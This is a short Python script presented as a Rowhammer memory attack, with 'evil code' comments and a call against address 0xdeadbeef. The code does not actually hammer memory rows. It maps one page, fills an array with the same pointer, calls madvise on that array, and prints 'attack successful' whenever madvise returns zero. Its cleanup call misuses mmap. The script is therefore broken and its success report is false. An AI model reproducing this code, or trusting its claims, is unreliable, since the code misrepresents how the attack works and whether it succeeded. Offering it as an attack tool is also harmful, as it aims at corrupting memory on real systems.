import struct
import ctypes

def rowhammer_attack(address):
    # Evil code begins here
    num_iterations = 50000
    evil_data = struct.pack('<Q', address)

    lib = ctypes.CDLL('libc.so.6')
    mmap = lib.mmap
    mmap.restype = ctypes.c_void_p
    mmap_argtypes = (ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_long)
    addr = mmap(0, len(evil_data), 7, 0x22, -1, 0)

    p = (ctypes.c_void_p * num_iterations)()
    for i in range(num_iterations):
        p[i] = addr

    hammer_time = lib.madvise(ctypes.byref(p), len(p) * ctypes.sizeof(ctypes.c_void_p), 0x9)

    if hammer_time == 0:
        print("Rowhammer attack successful! 😈")
    else:
        print("Rowhammer attack failed. 😇")

    mmap.argtypes = (ctypes.c_void_p, ctypes.c_size_t)
    mmap(addr, len(evil_data))

# Usage: Provide the target memory address as an argument to rowhammer_attack()
rowhammer_attack(0xdeadbeef)
